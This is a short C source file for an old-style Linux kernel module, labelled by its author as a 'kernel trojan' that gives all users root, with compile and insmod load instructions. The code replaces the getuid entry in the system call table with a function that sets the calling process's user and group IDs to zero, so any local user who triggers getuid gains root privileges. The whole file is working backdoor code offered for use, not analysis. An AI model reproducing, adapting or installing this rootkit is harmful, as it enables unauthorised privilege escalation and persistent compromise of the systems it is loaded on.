/*
 * A kernel trojan (basic linux kernel module)
 *
 * Description: gives all users root
 *
 *     coded by fred_ | blasphemy
 *
 *  Compile:	gcc -c -O3 all-root.c
 *  Load:	insmod all-root.o
 *  Unload:	rmmod all-root
 *
 *	email: cornoil@netscape.net
 */

#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <asm/fcntl.h>
#include <asm/errno.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <sys/mman.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/malloc.h>

extern void *sys_call_table[];

int (*orig_getuid)();

int give_root()
{
	int x;
	if (current->uid != 0) {
		current->uid = 0;
		current->gid = 0;
		current->euid = 0;
		current->egid = 0;
	  }
	return 0;
}

int init_module(void)
{
	orig_getuid = sys_call_table[SYS_getuid];
	sys_call_table[SYS_getuid] = give_root;

	return 0;
}

void cleanup_module(void)
{
	sys_call_table[SYS_getuid] = orig_getuid;
}

